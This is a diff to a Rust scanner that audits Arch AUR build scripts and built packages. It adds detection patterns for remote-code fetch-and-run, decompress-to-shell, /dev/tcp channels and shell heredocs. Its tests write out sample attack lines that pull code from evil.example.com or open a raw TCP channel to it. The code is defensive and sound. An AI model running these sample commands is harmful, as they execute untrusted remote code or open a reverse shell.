@@ -259,6 +259,301 @@ pub(crate) fn line_of_source_process_subst(source: &str) -> Option<usize> {
         .map(|i| i + 1)
 }
 
+/// sh/bash/zsh/python/perl/node/... fed a curl/wget process substitution
+/// (`bash <(curl -sL url)`) -- runs fetched remote content with no pipe
+/// and no command substitution for the other checks to key on.
+/// `source <(...)` is the separate source_process_subst check; data-tool
+/// consumers (`diff <(curl a) <(curl b)`, `jq <(...)` ...) don't execute
+/// and stay clean.
+pub(crate) fn interp_process_subst_line(line: &str) -> bool {
+    let l = line.trim();
+    if l.starts_with('#') {
+        return false;
+    }
+    let lower = l.to_lowercase();
+    if !lower.contains("<(") || !(lower.contains("curl ") || lower.contains("wget ")) {
+        return false;
+    }
+    let head = lower.split("<(").next().unwrap_or("").trim();
+    let mut tokens = head.split_whitespace();
+    let mut first = tokens.next().unwrap_or("");
+    // `env`/`sudo`/`nohup` wrappers: skip to the actual interpreter.
+    if matches!(first, "env" | "sudo" | "nohup") {
+        first = tokens.find(|t: &&str| !t.starts_with('-')).unwrap_or("");
+    }
+    let basename = first.rsplit('/').next().unwrap_or(first);
+    matches!(
+        basename,
+        "sh" | "bash" | "zsh" | "ksh" | "dash" | "source" | "." | "perl" | "ruby" | "irb"
+            | "node" | "nodejs" | "deno" | "php" | "Rscript"
+    ) || basename.starts_with("python")
+        || basename.starts_with("pypy")
+        || basename.starts_with("lua")
+}
+
+pub(crate) fn line_of_interp_process_subst(source: &str) -> Option<usize> {
+    source
+        .lines()
+        .position(interp_process_subst_line)
+        .map(|i| i + 1)
+}
+
+/// Last `|` stage is a scripting interpreter. Superset of
+/// [`pipes_into_shell`]: decoders/decompressors and fetchers piped into
+/// python/perl/node/... execute just as much as into sh. Read-only data
+/// tools (awk/sed/grep/jq/head/...) are deliberately absent: `curl | jq`
+/// reads, it doesn't run.
+fn pipes_into_interpreter(lower_line: &str) -> bool {
+    let after_pipe = lower_line.rsplit('|').next().unwrap_or("").trim();
+    let mut tokens = after_pipe.split_whitespace();
+    let mut first = tokens.next().unwrap_or("");
+    if matches!(first, "env" | "sudo") {
+        first = tokens.find(|t: &&str| !t.starts_with('-')).unwrap_or("");
+    }
+    let basename = first.rsplit('/').next().unwrap_or(first);
+    matches!(
+        basename,
+        "sh" | "bash" | "zsh" | "ksh" | "dash" | "source" | "." | "perl" | "ruby" | "irb"
+            | "node" | "nodejs" | "deno" | "bun" | "php" | "Rscript"
+    ) || basename.starts_with("python")
+        || basename.starts_with("pypy")
+        || basename.starts_with("lua")
+}
+
+/// curl/wget piped into a scripting interpreter (`curl ... | python3 -`)
+/// -- remote code execution with no shell anywhere in the pipeline.
+/// Shell receivers (`curl | sh`) are curl_pipe_shell's finding, so this
+/// check only fires when the last stage is a non-shell interpreter --
+/// otherwise one pipeline would produce two findings.
+pub(crate) fn fetch_piped_to_interpreter_line(line: &str) -> bool {
+    let l = line.trim();
+    if l.starts_with('#') {
+        return false;
+    }
+    let lower = l.to_lowercase();
+    let has_fetcher = lower.contains("curl ")
+        || lower.contains("curl\t")
+        || lower.contains("wget ")
+        || lower.contains("wget\t");
+    if !has_fetcher || !lower.contains('|') {
+        return false;
+    }
+    pipes_into_interpreter(&lower) && !pipes_into_shell(&lower)
+}
+
+pub(crate) fn line_of_fetch_piped_to_interpreter(source: &str) -> Option<usize> {
+    source
+        .lines()
+        .position(fetch_piped_to_interpreter_line)
+        .map(|i| i + 1)
+}
+
+/// Decompressor piped straight into a shell/interpreter (`gunzip -c p.gz
+/// | sh`, `zstd -dc p.zst | bash`, `unzip -p p.zip | sh`, `tar -xO | sh`,
+/// ...) -- the inline-payload sibling of curl|sh: the executable content
+/// is stashed compressed instead of fetched.
+pub(crate) fn decompress_pipe_shell_line(line: &str) -> bool {
+    const DECOMPRESSORS: &[&str] = &[
+        "zcat",
+        "gzcat",
+        "gunzip",
+        "gzip -d",
+        "zstd -d",
+        "unzstd",
+        "xz -d",
+        "unxz",
+        "lzma -d",
+        "unlzma",
+        "bzip2 -d",
+        "bunzip2",
+        "lz4 -d",
+        "brotli -d",
+        "7z x",
+        "7za x",
+        "7z e",
+        "7za e",
+        "unzip -p",
+        "unzip -o -p",
+        "openssl enc -d",
+        "openssl zlib -d",
+    ];
+    let l = line.trim();
+    if l.starts_with('#') {
+        return false;
+    }
+    let lower = l.to_lowercase();
+    if !lower.contains('|') {
+        return false;
+    }
+    let decompressor = DECOMPRESSORS.iter().any(|d| lower.contains(d))
+        || l.split('|').any(tar_stage_writes_to_stdout);
+    decompressor && pipes_into_interpreter(&lower)
+}
+
+/// `tar`/`bsdtar`/`gtar` writing extracted file bodies to stdout (`-xO`
+/// fused into one cluster like `-xOzf`, split `-x -O`, or the long
+/// `--to-stdout`; the long form counts on its own, like the old literal
+/// did). Runs on the original line with per-char flag scanning because
+/// tar flags are case-sensitive: in extract mode lowercase `-o` means
+/// --no-same-owner, not stdout, and a pre-lowercased substring could
+/// never see the `-O` at all (the old "tar -xO" entry was dead against
+/// the lowercased line and hid the whole tar branch).
+fn tar_stage_writes_to_stdout(stage: &str) -> bool {
+    let mut tokens = stage.trim().split_whitespace();
+    let mut prog = tokens.next().unwrap_or("");
+    if matches!(prog, "sudo" | "env" | "nohup") {
+        prog = tokens.find(|t: &&str| !t.starts_with('-')).unwrap_or("");
+    }
+    if !matches!(
+        prog.rsplit('/').next().unwrap_or(prog),
+        "tar" | "bsdtar" | "gtar"
+    ) {
+        return false;
+    }
+    let mut extract = false;
+    let mut short_stdout = false;
+    let mut long_stdout = false;
+    for tok in tokens {
+        if let Some(long) = tok.strip_prefix("--") {
+            match long.split('=').next().unwrap_or(long) {
+                "to-stdout" => long_stdout = true,
+                "extract" | "get" => extract = true,
+                _ => {}
+            }
+        } else if tok.starts_with('-') && tok.len() > 1 {
+            for c in tok.chars().skip(1) {
+                match c {
+                    'x' => extract = true,
+                    'O' => short_stdout = true,
+                    _ => {}
+                }
+            }
+        }
+    }
+    (extract && short_stdout) || long_stdout
+}
+
+pub(crate) fn line_of_decompress_pipe_shell(source: &str) -> Option<usize> {
+    source
+        .lines()
+        .position(decompress_pipe_shell_line)
+        .map(|i| i + 1)
+}
+
+/// /dev/tcp or /dev/udp redirection (`exec 3<>/dev/tcp/host/port`) --
+/// opens a raw network channel from inside bash. Nothing in a legit
+/// build needs it; the sh -c variant is separately caught by shell_c.
+pub(crate) fn dev_tcp_line(line: &str) -> bool {
+    let l = line.trim();
+    if l.starts_with('#') {
+        return false;
+    }
+    let lower = l.to_lowercase();
+    lower.contains("/dev/tcp/") || lower.contains("/dev/udp/")
+}
+
+pub(crate) fn line_of_dev_tcp(source: &str) -> Option<usize> {
+    source.lines().position(dev_tcp_line).map(|i| i + 1)
+}
+
+/// Delimiter word of a `<<`/`<<-` heredoc starting on this line, plus
+/// whether the command before `<<` is itself a shell interpreter.
+/// `<<<` (here-string) does not count.
+fn shell_heredoc_start(line: &str) -> Option<(bool, &str)> {
+    let op = line.find("<<")?;
+    if line[op + 2..].starts_with('<') {
+        return None; // here-string
+    }
+    let mut rest = &line[op + 2..];
+    rest = rest.strip_prefix('-').unwrap_or(rest);
+    let rest = rest.trim_start();
+    let (raw, _after) = if let Some(r) = rest.strip_prefix('\'') {
+        let end = r.find('\'')?;
+        (&r[..end], &r[end + 1..])
+    } else if let Some(r) = rest.strip_prefix('"') {
+        let end = r.find('"')?;
+        (&r[..end], &r[end + 1..])
+    } else {
+        // `bash <<EOF` (end of line) is as legal as `cat <<EOF > f` --
+        // no terminator means the delimiter runs to the end.
+        let end = rest
+            .find(|c: char| c.is_whitespace() || c == ';' || c == '|')
+            .unwrap_or(rest.len());
+        (&rest[..end], &rest[end..])
+    };
+    if raw.is_empty()
+        || !raw
+            .chars()
+            .all(|c| c.is_ascii_alphanumeric() || c == '_' || c == '-' || c == '.')
+    {
+        return None;
+    }
+    let head = line[..op].trim().to_lowercase();
+    let mut tokens = head.split_whitespace();
+    let mut first = tokens.next().unwrap_or("");
+    if matches!(first, "env" | "sudo" | "nohup") {
+        first = tokens.find(|t: &&str| !t.starts_with('-')).unwrap_or("");
+    }
+    let basename = first.rsplit('/').next().unwrap_or(first);
+    let head_is_shell = matches!(basename, "sh" | "bash" | "zsh" | "ksh" | "dash")
+        // `cat <<EOF | sh` -- the heredoc is piped into a shell even
+        // though the command before `<<` isn't one.
+        || (line.to_lowercase().contains('|') && pipes_into_shell(&line.to_lowercase()));
+    Some((head_is_shell, raw))
+}
+
+/// A heredoc fed to a shell interpreter (`bash <<EOF ... EOF`) or piped
+/// into one (`cat <<EOF | sh`), or a heredoc body that fetches/decodes
+/// remote content -- the fetch and the execution live on different
+/// lines, so single-line checks never see them together. Legit
+/// `cat <<EOF > file` document writes stay clean.
+pub(crate) fn line_of_shell_heredoc_exec(source: &str) -> Option<usize> {
+    let lines: Vec<&str> = source.lines().collect();
+    let mut i = 0;
+    while i < lines.len() {
+        let l = lines[i].trim();
+        let heredoc = if l.starts_with('#') {
+            None
+        } else {
+            shell_heredoc_start(l)
+        };
+        if let Some((head_is_shell, delim)) = heredoc {
+            let mut body_hits = false;
+            let mut body_nonempty = false;
+            let mut j = i + 1;
+            while j < lines.len() {
+                let body = lines[j].trim();
+                if body == delim {
+                    break;
+                }
+                if !body.is_empty() && !body.starts_with('#') {
+                    body_nonempty = true;
+                }
+                let bl = body.to_lowercase();
+                if bl.contains("curl ")
+                    || bl.contains("curl\t")
+                    || bl.contains("wget ")
+                    || bl.contains("wget\t")
+                    || bl.contains("base64 -d")
+                    || bl.contains("base64 --decode")
+                    || bl.contains("xxd -r")
+                    || bl.contains("/dev/tcp/")
+                    || bl.contains("/dev/udp/")
+                {
+                    body_hits = true;
+                }
+                j += 1;
+            }
+            if body_hits || (head_is_shell && body_nonempty) {
+                return Some(i + 1);
+            }
+            i = j; // skip past the (clean) heredoc body
+        }
+        i += 1;
+    }
+    None
+}
+
 /// chmod 777 / a+rwx (overly permissive for a build script).
 pub(crate) fn chmod_777_line(line: &str) -> bool {
     let l = line.trim();
@@ -694,10 +989,10 @@ const PIP_VALUE_TAKING_FLAGS: &[&str] = &[
     "--constraint",
 ];
 
-/// npm/bun/pip install of a named external package (Atomic Arch pattern).
-/// Bare `npm ci`/`npm install` (no package arg, just flags) is fine --
-/// that installs from an existing package.json/requirements.txt, the
-/// normal way a JS/Python project pulls in its own declared
+/// npm/pnpm/bun/pip install of a named external package (Atomic Arch
+/// pattern). Bare `npm ci`/`npm install` (no package arg, just flags) is
+/// fine -- that installs from an existing package.json/requirements.txt,
+/// the normal way a JS/Python project pulls in its own declared
 /// dependencies mid-build. FP: legit global CLI installs - review only.
 pub(crate) fn foreign_pkg_manager_install_line(line: &str) -> bool {
     // gem has no verified value-taking-flag list, so every `-`-prefixed
@@ -705,6 +1000,9 @@ pub(crate) fn foreign_pkg_manager_install_line(line: &str) -> bool {
     const PATTERNS: &[(&str, &[&str])] = &[
         ("npm install ", NPM_VALUE_TAKING_FLAGS),
         ("npm i ", NPM_VALUE_TAKING_FLAGS),
+        ("pnpm add ", NPM_VALUE_TAKING_FLAGS),
+        ("pnpm install ", NPM_VALUE_TAKING_FLAGS),
+        ("pnpm i ", NPM_VALUE_TAKING_FLAGS),
         ("bun install ", NPM_VALUE_TAKING_FLAGS),
         ("bun add ", NPM_VALUE_TAKING_FLAGS),
         ("yarn add ", NPM_VALUE_TAKING_FLAGS),
@@ -719,7 +1017,11 @@ pub(crate) fn foreign_pkg_manager_install_line(line: &str) -> bool {
     let lower = l.to_lowercase();
     for (p, value_flags) in PATTERNS {
         if let Some(idx) = lower.find(p) {
-            let rest = &l[idx + p.len()..];
+            // Slice the lowercased copy: `idx` is an offset in `lower`,
+            // and to_lowercase can change byte lengths (e.g. İ), so
+            // reusing it on the original line can land mid-char and
+            // panic. The token checks below are ASCII-only anyway.
+            let rest = &lower[idx + p.len()..];
             let mut tokens = rest.split_whitespace().peekable();
             let mut first_pkg_tok = None;
             while let Some(tok) = tokens.next() {
@@ -744,9 +1046,75 @@ pub(crate) fn foreign_pkg_manager_install_line(line: &str) -> bool {
     false
 }
 
+/// cargo/go value-taking flags: without consuming their values, a
+/// `--root "$pkgdir"/usr` or `-ldflags "-s -w"` argument would be
+/// mistaken for the package name (and the real one after it missed).
+const CARGO_VALUE_TAKING_FLAGS: &[&str] = &[
+    "--root", "--index", "--registry", "--target", "--path", "-j", "--jobs",
+];
+// Tokens arrive pre-lowercased (the line is lowercased first), so the
+// entries must be lowercase too: a `-C` entry can never match, its
+// value is then mistaken for the package name, and the real remote
+// target behind it escapes the scan.
+const GO_VALUE_TAKING_FLAGS: &[&str] = &["-c", "-o", "-ldflags", "-mod", "-p"];
+
+/// `cargo install`/`go install` of a named remote crate/module --
+/// fetches and builds arbitrary upstream code outside pacman's view
+/// mid-build. Local targets (`cargo install --path .`, `go install
+/// ./...`) and short in-module names are the normal packaging flow and
+/// stay clean; a domain-ish or `@version` target is a remote fetch.
+pub(crate) fn toolchain_install_line(line: &str) -> bool {
+    let l = line.trim();
+    if l.starts_with('#') {
+        return false;
+    }
+    let lower = l.to_lowercase();
+    let (pattern, value_flags, remote_only) = if lower.contains("cargo install ") {
+        ("cargo install ", CARGO_VALUE_TAKING_FLAGS, false)
+    } else if lower.contains("go install ") {
+        ("go install ", GO_VALUE_TAKING_FLAGS, true)
+    } else {
+        return false;
+    };
+    let idx = lower.find(pattern).unwrap_or(0);
+    let rest = &lower[idx + pattern.len()..];
+    let mut tokens = rest.split_whitespace().peekable();
+    let mut first_pkg_tok = None;
+    while let Some(tok) = tokens.next() {
+        if tok.starts_with('-') {
+            let flag = tok.split('=').next().unwrap_or(tok);
+            if !tok.contains('=') && value_flags.contains(&flag) {
+                tokens.next(); // consume this flag's value
+            }
+            continue;
+        }
+        first_pkg_tok = Some(tok);
+        break;
+    }
+    let Some(tok) = first_pkg_tok else {
+        return false;
+    };
+    if tok.starts_with('.') || tok.starts_with('/') {
+        return false;
+    }
+    if !remote_only {
+        // cargo install <name> always resolves the crate from the
+        // registry when it isn't a local path.
+        return true;
+    }
+    // go install: only a remote module spec is a fetch. `@version` and
+    // domain-shaped paths (github.com/x/y) are unambiguous; a short
+    // single word may be a local in-module package, so stay quiet.
+    tok.contains('@') || tok.contains('.')
+}
+
 #[cfg(test)]
 pub(crate) fn is_foreign_pkg_manager_install(source: &str) -> bool {
     source.lines().any(foreign_pkg_manager_install_line)
+}
+
+pub(crate) fn line_of_toolchain_install(source: &str) -> Option<usize> {
+    source.lines().position(toolchain_install_line).map(|i| i + 1)
 }
 
 pub(crate) fn line_of_foreign_pkg_manager_install(source: &str) -> Option<usize> {
@@ -1157,7 +1525,49 @@ pub(crate) fn scan_pkgbuild_source(source: &str) -> Vec<Finding> {
         findings.push(Finding {
             line,
             severity: Severity::Suspicious,
-            message: "installs a named external package via npm/bun/yarn/pip/gem mid-build - worth a quick check that the package name is one you'd expect; this general technique (not necessarily this specific package) is how the Atomic Arch AUR campaign smuggled in its payload".to_string(),
+            message: "installs a named external package via npm/pnpm/bun/yarn/pip/gem mid-build - worth a quick check that the package name is one you'd expect; this general technique (not necessarily this specific package) is how the Atomic Arch AUR campaign smuggled in its payload".to_string(),
+        });
+    }
+    if let Some(line) = line_of_toolchain_install(source) {
+        findings.push(Finding {
+            line,
+            severity: Severity::Suspicious,
+            message: "installs a named remote crate/module via cargo/go install mid-build - fetches and builds upstream code outside pacman's view; local targets (--path ., ./...) are the normal packaging flow and don't trigger this".to_string(),
+        });
+    }
+    if let Some(line) = line_of_interp_process_subst(source) {
+        findings.push(Finding {
+            line,
+            severity: Severity::Suspicious,
+            message: "feeds a curl/wget process substitution straight to a shell/interpreter (bash <(curl ...)) - runs fetched remote content with neither a pipe nor a command substitution for the other checks to key on".to_string(),
+        });
+    }
+    if let Some(line) = line_of_fetch_piped_to_interpreter(source) {
+        findings.push(Finding {
+            line,
+            severity: Severity::Suspicious,
+            message: "downloads and pipes a remote script straight into an interpreter (curl/wget | python3/perl/node/...) - remote code execution with no shell in the pipeline".to_string(),
+        });
+    }
+    if let Some(line) = line_of_decompress_pipe_shell(source) {
+        findings.push(Finding {
+            line,
+            severity: Severity::Suspicious,
+            message: "decompresses a bundled/compressed blob and pipes it straight into a shell or interpreter (gunzip/zstd -d/unzip -p/tar -xO | sh) - same inline-payload role as base64 -d | sh, just compressed instead of encoded".to_string(),
+        });
+    }
+    if let Some(line) = line_of_dev_tcp(source) {
+        findings.push(Finding {
+            line,
+            severity: Severity::Suspicious,
+            message: "opens a raw TCP/UDP channel via bash /dev/tcp//dev/udp redirection (exec 3<>/dev/tcp/host/port) - classic reverse-shell/download primitive; no legit build step needs it".to_string(),
+        });
+    }
+    if let Some(line) = line_of_shell_heredoc_exec(source) {
+        findings.push(Finding {
+            line,
+            severity: Severity::Suspicious,
+            message: "runs a here-document through a shell, or a heredoc body that fetches/decodes remote content (bash <<EOF ... curl ... EOF) - the fetch and the execution live on different lines, so per-line checks never see them together".to_string(),
         });
     }
     if let Some(line) =
@@ -1436,7 +1846,31 @@ const SUPPORT_LINE_CHECKS: &[(LineCheck, &str)] = &[
     ),
     (
         line_of_foreign_pkg_manager_install,
-        "installs a named external package via npm/bun/yarn/pip/gem mid-build - worth a quick check that the package name is one you'd expect",
+        "installs a named external package via npm/pnpm/bun/yarn/pip/gem mid-build - worth a quick check that the package name is one you'd expect",
+    ),
+    (
+        line_of_toolchain_install,
+        "installs a named remote crate/module via cargo/go install mid-build - fetches and builds upstream code outside pacman's view; local targets (--path ., ./...) are the normal packaging flow and don't trigger this",
+    ),
+    (
+        line_of_interp_process_subst,
+        "feeds a curl/wget process substitution straight to a shell/interpreter (bash <(curl ...)) - runs fetched remote content with neither a pipe nor a command substitution for the other checks to key on",
+    ),
+    (
+        line_of_fetch_piped_to_interpreter,
+        "downloads and pipes a remote script straight into an interpreter (curl/wget | python3/perl/node/...) - remote code execution with no shell in the pipeline",
+    ),
+    (
+        line_of_decompress_pipe_shell,
+        "decompresses a bundled/compressed blob and pipes it straight into a shell or interpreter (gunzip/zstd -d/unzip -p/tar -xO | sh) - same inline-payload role as base64 -d | sh, just compressed instead of encoded",
+    ),
+    (
+        line_of_dev_tcp,
+        "opens a raw TCP/UDP channel via bash /dev/tcp//dev/udp redirection (exec 3<>/dev/tcp/host/port) - classic reverse-shell/download primitive; no legit build step needs it",
+    ),
+    (
+        line_of_shell_heredoc_exec,
+        "runs a here-document through a shell, or a heredoc body that fetches/decodes remote content (bash <<EOF ... curl ... EOF) - the fetch and the execution live on different lines, so per-line checks never see them together",
     ),
     (
         line_of_decoy_tool_binary,
@@ -2520,8 +2954,17 @@ const DANGEROUS_PKG_PATH_SUBSTR: &[&str] = &[
     "/etc/ld.so.preload",
     "/etc/ld.so.conf.d/",
     "/etc/modules-load.d/",
+    "/usr/lib/modules-load.d/",
     "/etc/sysctl.d/",
     "/etc/tmpfiles.d/",
+    "/usr/lib/tmpfiles.d/",
+    "/usr/lib/binfmt.d/",
+    "/etc/pam.d/",
+    "/etc/dbus-1/system.d/",
+    "/usr/share/dbus-1/system.d/",
+    "/etc/NetworkManager/dispatcher.d/",
+    "/etc/environment.d/",
+    "/usr/lib/environment.d/",
     "/etc/X11/xorg.conf.d/",
     "/usr/lib/sysusers.d/",
 ];
@@ -2532,11 +2975,33 @@ struct PkgAuditFinding {
     reason: String,
 }
 
-/// Run `bsdtar -tvf` and collect suspicious members.
-fn audit_tarball(path: &std::path::Path) -> Result<Vec<PkgAuditFinding>, String> {
+/// Collapse `//` and `/./` segments so a crafted member name can't slip
+/// a dangerous path past the substring match below (`usr//share/...`,
+/// `usr/./share/...` all normalize to the canonical form). Every result
+/// starts with `/`; `..` segments are refused by the caller.
+fn normalize_pkg_path(p: &str) -> String {
+    let mut out = String::with_capacity(p.len() + 1);
+    for seg in p.split('/') {
+        match seg {
+            "" | "." => {}
+            other => {
+                out.push('/');
+                out.push_str(other);
+            }
+        }
+    }
+    if out.is_empty() {
+        "/".to_string()
+    } else {
+        out
+    }
+}
+
+/// Run `bsdtar` and return stdout lines; stderr goes into the error.
+fn bsdtar_lines(args: &[&str], path: &std::path::Path) -> Result<Vec<String>, String> {
     use std::process::{Command, Stdio};
     let out = Command::new("/usr/bin/bsdtar")
-        .args(["-tvf"])
+        .args(args)
         .arg(path)
         .stdout(Stdio::piped())
         .stderr(Stdio::piped())
@@ -2545,43 +3010,67 @@ fn audit_tarball(path: &std::path::Path) -> Result<Vec<PkgAuditFinding>, String>
     if !out.status.success() {
         let err = String::from_utf8_lossy(&out.stderr);
         return Err(format!(
-            "bsdtar -tvf failed for {}: {}",
+            "bsdtar {} failed for {}: {}",
+            args.first().unwrap_or(&"?"),
             path.display(),
             err.trim()
         ));
     }
-    let listing = String::from_utf8_lossy(&out.stdout);
+    Ok(String::from_utf8_lossy(&out.stdout)
+        .lines()
+        .map(str::to_string)
+        .collect())
+}
+
+/// Audit one archive's member list. Names come from `bsdtar -tf`
+/// (verbatim, spaces included); only the first token (mode, no spaces)
+/// is taken from the `bsdtar -tvf` verbose listing. The verbose line is
+/// *not* parsed for member names on purpose: it is not quoted, and
+/// symlink members print `name -> target`, so a naive "last whitespace
+/// token" grab yields the symlink target instead of the member path and
+/// a symlink planted at a sensitive path matched nothing.
+fn audit_tarball(path: &std::path::Path) -> Result<Vec<PkgAuditFinding>, String> {
+    let names = bsdtar_lines(&["-tf"], path)?;
+    let verbose = bsdtar_lines(&["-tvf"], path)?;
+    if names.len() != verbose.len() {
+        return Err(format!(
+            "bsdtar listing mismatch for {} ({} vs {} lines)",
+            path.display(),
+            names.len(),
+            verbose.len()
+        ));
+    }
     let mut findings = Vec::new();
-    for line in listing.lines() {
-        let trimmed = line.trim();
-        if trimmed.is_empty() {
+    for (name, vline) in names.iter().zip(verbose.iter()) {
+        if name.is_empty() || name == "." {
             continue;
         }
-        let mode = trimmed.split_whitespace().next().unwrap_or("");
-        let member = trimmed.split_whitespace().last().unwrap_or("");
-        if member.is_empty() || member == "." {
+        let mode = vline.trim().split_whitespace().next().unwrap_or("");
+        let path_for_match = normalize_pkg_path(name);
+
+        if name.split('/').any(|seg| seg == "..") {
+            findings.push(PkgAuditFinding {
+                path: name.clone(),
+                reason: "path traversal in archive member".to_string(),
+            });
             continue;
         }
-        let path_for_match = if member.starts_with('/') {
-            member.to_string()
-        } else {
-            format!("/{}", member)
-        };
 
         if mode.len() >= 4 {
             let u = mode.as_bytes().get(3).copied().unwrap_or(0);
             let g = mode.as_bytes().get(6).copied().unwrap_or(0);
             if u == b's' || u == b'S' || g == b's' || g == b'S' {
                 findings.push(PkgAuditFinding {
-                    path: member.to_string(),
+                    path: name.clone(),
                     reason: format!("setuid/setgid binary (mode {})", mode),
                 });
             }
         }
 
-        if member == ".INSTALL" || member.ends_with(".install") {
+        let base = name.rsplit('/').next().unwrap_or(name);
+        if base == ".INSTALL" || base.ends_with(".install") {
             findings.push(PkgAuditFinding {
-                path: member.to_string(),
+                path: name.clone(),
                 reason: "package install script (runs as root on -U/-R)".to_string(),
             });
         }
@@ -2590,7 +3079,7 @@ fn audit_tarball(path: &std::path::Path) -> Result<Vec<PkgAuditFinding>, String>
             if path_for_match.contains(sub) || path_for_match.starts_with(sub.trim_end_matches('/'))
             {
                 findings.push(PkgAuditFinding {
-                    path: member.to_string(),
+                    path: name.clone(),
                     reason: format!("sensitive path matching {}", sub),
                 });
                 break;
@@ -2664,12 +3153,16 @@ pub(crate) fn audit_built_packages(tarballs: &[String], force_prompt: bool) -> b
                 }
             }
             Err(e) => {
+                // Fail closed: an archive we cannot even list would skip
+                // the setuid/.INSTALL/hook gate entirely, so it does not
+                // get installed either.
                 eprintln!(
-                    "{} could not audit {}: {} (continuing, but review manually)",
-                    ">>> Warning:".t_yellow().bold(),
+                    "{} could not audit {} - not installing: {}",
+                    ">>> Error:".t_red().bold(),
                     path.display(),
                     e
                 );
+                return false;
             }
         }
     }
@@ -2705,6 +3198,49 @@ pub(crate) fn audit_built_packages(tarballs: &[String], force_prompt: bool) -> b
 mod scanner_tests {
     use super::*;
 
+    // ── archive member path normalization (audit_tarball matching) ──────
+
+    #[test]
+    fn pkg_path_normalizes_segments() {
+        assert_eq!(
+            normalize_pkg_path("usr/share/libalpm/hooks/x.hook"),
+            "/usr/share/libalpm/hooks/x.hook"
+        );
+        // Double slashes and dot segments used to bypass the substring
+        // match; they must all normalize to the canonical form.
+        assert_eq!(
+            normalize_pkg_path("usr//share/libalpm/hooks/x.hook"),
+            "/usr/share/libalpm/hooks/x.hook"
+        );
+        assert_eq!(
+            normalize_pkg_path("usr/./share/libalpm/hooks/x.hook"),
+            "/usr/share/libalpm/hooks/x.hook"
+        );
+        assert_eq!(normalize_pkg_path("/"), "/");
+        assert_eq!(normalize_pkg_path(""), "/");
+    }
+
+    #[test]
+    fn normalized_pkg_path_still_matches_dangerous_list() {
+        let normalized = normalize_pkg_path("usr//share/libalpm/hooks/evil.hook");
+        assert!(DANGEROUS_PKG_PATH_SUBSTR
+            .iter()
+            .any(|sub| normalized.contains(sub) || normalized.starts_with(sub.trim_end_matches('/'))));
+        // Spaces inside a member name survive now that names come from
+        // `bsdtar -tf` instead of the unquoted verbose listing.
+        let spaced = normalize_pkg_path("usr/share/libalpm/hooks/spaced name.hook");
+        assert!(spaced.contains("/usr/share/libalpm/hooks/"));
+    }
+
+    #[test]
+    fn foreign_install_lowercasing_cannot_panic_on_multibyte() {
+        // to_lowercase changes byte lengths (İ -> 3 bytes), which used to
+        // make the original-line slice land mid-char and panic. The
+        // substring match still fires (safe/false-positive direction).
+        assert!(foreign_pkg_manager_install_line("İnpm install évil"));
+        assert!(foreign_pkg_manager_install_line("NPM INSTALL left-pad"));
+    }
+
     #[test]
     fn curl_pipe_sh_detected() {
         assert!(is_curl_pipe_shell(
@@ -2717,6 +3253,206 @@ mod scanner_tests {
             "curl -sSL https://example.com/x -o file.tar.gz"
         ));
         assert!(!is_curl_pipe_shell("# curl foo | sh (just a comment)"));
+    }
+
+    // ── blind-zone closures: bash <(curl), heredocs, |python, decompress|sh,
+    // ── /dev/tcp, pnpm/cargo/go ─────────────────────────────────────────
+
+    #[test]
+    fn interp_process_subst_caught_and_data_tools_clean() {
+        assert!(interp_process_subst_line("bash <(curl -sL https://evil.example.com/x)"));
+        assert!(interp_process_subst_line("sh -c 'echo hi' <(wget -qO- http://x/y)"));
+        assert!(interp_process_subst_line("sudo bash <(curl -s https://x/y)"));
+        assert!(interp_process_subst_line("/bin/zsh <(curl -s https://x/y)"));
+        assert!(interp_process_subst_line("python3 <(curl -s https://x/y)"));
+        // source <( stays on its own dedicated check, but this catches it too.
+        assert!(interp_process_subst_line("source <(curl -s https://x/y)"));
+        // Data-tool consumers don't execute the fetched content.
+        assert!(!interp_process_subst_line(
+            "diff <(curl -s https://x/a) <(curl -s https://x/b)"
+        ));
+        assert!(!interp_process_subst_line("jq . <(curl -s https://x/api)"));
+        // No fetch, no finding.
+        assert!(!interp_process_subst_line("bash <(cat local.sh)"));
+        assert!(!interp_process_subst_line("# bash <(curl ...) comment"));
+        // echo writing its arguments is not an execution.
+        assert!(!interp_process_subst_line("echo bash <(curl -s https://x/y)"));
+    }
+
+    #[test]
+    fn fetch_piped_to_interpreter_detected() {
+        assert!(fetch_piped_to_interpreter_line(
+            "curl -sSL https://evil.example.com/x.py | python3 -"
+        ));
+        assert!(fetch_piped_to_interpreter_line(
+            "wget -qO- https://evil.example.com/x.pl | perl"
+        ));
+        assert!(fetch_piped_to_interpreter_line(
+            "curl -s https://x/y.js | node -"
+        ));
+        assert!(fetch_piped_to_interpreter_line(
+            "curl -s https://x/y | python3 -c 'import sys; exec(sys.stdin.read())'"
+        ));
+        // Read-only data tools are not interpreters.
+        assert!(!fetch_piped_to_interpreter_line(
+            "curl -s https://x/feed.json | jq .name"
+        ));
+        assert!(!fetch_piped_to_interpreter_line(
+            "curl -s https://x/log | grep error"
+        ));
+        assert!(!fetch_piped_to_interpreter_line(
+            "curl -s https://x/ -o out.json"
+        ));
+    }
+
+    #[test]
+    fn decompress_pipe_shell_detected() {
+        assert!(decompress_pipe_shell_line("gunzip -c payload.gz | sh"));
+        assert!(decompress_pipe_shell_line("zstd -dc payload.zst | bash"));
+        assert!(decompress_pipe_shell_line("unzstd -c payload.zst | sh"));
+        assert!(decompress_pipe_shell_line("unzip -p payload.zip | sh"));
+        assert!(decompress_pipe_shell_line("tar -xOzf pkg.tar.gz | bash"));
+        assert!(decompress_pipe_shell_line("tar -x -O -z -f pkg.tar.gz | bash"));
+        assert!(decompress_pipe_shell_line("bsdtar -xOf pkg.tar usr/bin/x | sh"));
+        assert!(decompress_pipe_shell_line("sudo tar --to-stdout -xf pkg.tar | sh"));
+        assert!(decompress_pipe_shell_line("cat a.tbz | gtar -xOj | bash"));
+        assert!(decompress_pipe_shell_line("xz -dc blob.xz | python3"));
+        assert!(decompress_pipe_shell_line("openssl enc -d -in p.enc | sh"));
+        // Decompression without a shell/interpreter on the end is a normal
+        // file operation.
+        assert!(!decompress_pipe_shell_line("gunzip -c payload.gz > payload.txt"));
+        assert!(!decompress_pipe_shell_line("zcat changelog.gz | head -20"));
+        assert!(!decompress_pipe_shell_line("tar -xzf pkg.tar.gz"));
+        // tar flags are case-sensitive: lowercase -o in extract mode is
+        // --no-same-owner, not stdout.
+        assert!(!decompress_pipe_shell_line("tar -xof pkg.tar | wc -l"));
+        // Create-to-stdout backups pipe a tar stream, not a payload.
+        assert!(!decompress_pipe_shell_line(
+            "tar -cOf backup.tar dir | ssh h 'cat > b'"
+        ));
+    }
+
+    #[test]
+    fn dev_tcp_detected() {
+        assert!(dev_tcp_line("exec 3<>/dev/tcp/evil.example.com/443"));
